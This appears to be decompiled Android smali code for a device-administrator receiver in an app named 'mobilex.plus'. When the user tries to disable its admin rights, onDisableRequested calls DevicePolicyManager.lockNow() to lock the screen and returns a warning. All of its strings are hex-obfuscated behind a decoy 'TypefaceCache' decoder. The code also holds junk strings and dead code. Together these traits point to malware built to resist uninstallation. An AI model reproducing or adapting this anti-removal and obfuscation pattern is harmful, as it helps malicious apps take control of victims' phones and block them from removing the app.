.class public final Lapp/mobilex/plus/receivers/DeviceAdminReceiver;
.super Landroid/app/admin/DeviceAdminReceiver;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"


# static fields
.field public static final Companion:Lv/s/xg1k7beQsmhLOomNTrI;

.field private static final TAG:Ljava/lang/String;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 1
    new-instance v0, Lv/s/xg1k7beQsmhLOomNTrI;

    nop

    nop

    .line 2
    .line 3
    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    .line 4
    .line 5
    .line 6
    sput-object v0, Lapp/mobilex/plus/receivers/DeviceAdminReceiver;->Companion:Lv/s/xg1k7beQsmhLOomNTrI;

    .line 7
    .line 8
    const-string v0, "00070073004D008E00F300BA00F300A3002E007F005500B500F500BC00D700AE003500730049"

    .line 9
    .line 10
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 11
    .line 12
    .line 13
    move-result-object v0

    .line 14
    sput-object v0, Lapp/mobilex/plus/receivers/DeviceAdminReceiver;->TAG:Ljava/lang/String;

    .line 15
    .line 16
    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 1
    invoke-direct {p0}, Landroid/app/admin/DeviceAdminReceiver;-><init>()V

    .line 2
    .line 3
    .line 4
    return-void
.end method

.method private static synthetic ybnabtdjpi()V
    .locals 1

    const-string v0, "Preferences"

    const-string v0, "com.model.kmbukwsjba"

    const-string v0, "auto"

    const-string v0, "Picasso"

    const-string v0, "net.model.yfkxqcxh"

    const-string v0, "DEBUG"

    const-string v0, "net.manager.ftfxs"

    return-void
.end method


# virtual methods
.method public onDisableRequested(Landroid/content/Context;Landroid/content/Intent;)Ljava/lang/CharSequence;
    .locals 5

    .line 1
    const-string p2, "00070073004D008E00F300BA009200A60027007B0052008900B000BB00DB00B4002200740057008200B000AD00D700B6003600730048009300F500BB009220D300630077005F008300F900B100D500E7002500640052008400E400B600DD00A9"

    .line 2
    .line 3
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 4
    .line 5
    .line 6
    :try_start_0
    const-string p2, "device_policy"

    .line 7
    .line 8
    invoke-virtual {p1, p2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 9
    .line 10
    .line 11
    move-result-object p2

    .line 12
    instance-of v0, p2, Landroid/app/admin/DevicePolicyManager;

    .line 13
    .line 14
    if-eqz v0, :cond_0

    .line 15
    .line 16
    check-cast p2, Landroid/app/admin/DevicePolicyManager;

    .line 17
    .line 18
    goto/16 :goto_0

    .line 19
    :catch_0
    move-exception p1

    nop

    .line 20
    goto/16 :goto_2

    .line 21
    :cond_0
    const/4 p2, 0x0

    .line 22
    :goto_0
    new-instance v0, Landroid/content/ComponentName;

    .line 23
    .line 24
    const-class v1, Landroid/app/admin/DeviceAdminReceiver;

    .line 25
    .line 26
    invoke-direct {v0, p1, v1}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 27
    .line 28
    .line 29
    :goto_1
    invoke-static {}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;

    .line 30
    .line 31
    .line 32
    move-result-object p1

    .line 33
    invoke-virtual {p1}, Ljava/lang/Runtime;->maxMemory()J

    .line 34
    .line 35
    .line 36
    move-result-wide v1

    .line 37
    const-wide/16 v3, 0x0

    .line 38
    .line 39
    cmp-long p1, v1, v3

    nop

    nop

    .line 40
    .line 41
    if-gez p1, :cond_1

    .line 42
    .line 43
    invoke-static {}, Ljava/lang/System;->nanoTime()J

    .line 44
    .line 45
    .line 46
    move-result-wide v1

    .line 47
    invoke-static {v1, v2}, Ljava/lang/Long;->hashCode(J)I

    .line 48
    .line 49
    .line 50
    goto/16 :goto_1

    .line 51
    :cond_1
    if-eqz p2, :cond_2

    .line 52
    .line 53
    invoke-virtual {p2, v0}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    .line 54
    .line 55
    .line 56
    move-result p1

    .line 57
    const/4 v0, 0x1

    .line 58
    if-ne p1, v0, :cond_2

    .line 59
    .line 60
    invoke-virtual {p2}, Landroid/app/admin/DevicePolicyManager;->lockNow()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 61
    .line 62
    .line 63
    goto :goto_3

    nop

    .line 64
    :goto_2
    const-string p2, "002F00790058008C00DE00B000C500E7002500770052008B00F500BB008800E7"

    .line 65
    .line 66
    invoke-static {p2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 67
    .line 68
    .line 69
    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 70
    .line 71
    .line 72
    :cond_2
    :goto_3
    const-string p1, "0007007F0048008600F200B300DB00A900240036004F008F00F500FF00D300A3002E007F0055008E00E300AB00C000A600370079004900C700E700B600DE00AB00630064005E008A00FF00A900D700E7003000730058009200E200B600C600BE006300660049008800E400BA00D100B3002A00790055009400BE00FF00F300B5002600360042008800E500FF00C100B2003100730004"

    .line 73
    .line 74
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 75
    .line 76
    .line 77
    move-result-object p1

    nop

    nop

    .line 78
    return-object p1
.end method

.method public onDisabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 1
    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onDisabled(Landroid/content/Context;Landroid/content/Intent;)V

    .line 2
    .line 3
    .line 4
    const-string p1, "00070073004D008E00F300BA009200A60027007B0052008900B000BB00DB00B4002200740057008200F4"

    .line 5
    .line 6
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    return-void

    nop
.end method

.method public onEnabled(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 1
    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onEnabled(Landroid/content/Context;Landroid/content/Intent;)V

    .line 2
    .line 3
    .line 4
    const-string p1, "00070073004D008E00F300BA009200A60027007B0052008900B000BA00DC00A60021007A005E0083"

    .line 5
    .line 6
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    return-void
.end method

.method public onPasswordChanged(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0

    .line 1
    invoke-super {p0, p1, p2}, Landroid/app/admin/DeviceAdminReceiver;->onPasswordChanged(Landroid/content/Context;Landroid/content/Intent;)V

    .line 2
    .line 3
    .line 4
    const-string p1, "001300770048009400E700B000C000A3006300750053008600FE00B800D700A3"

    .line 5
    .line 6
    invoke-static {p1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 7
    .line 8
    .line 9
    return-void
.end method
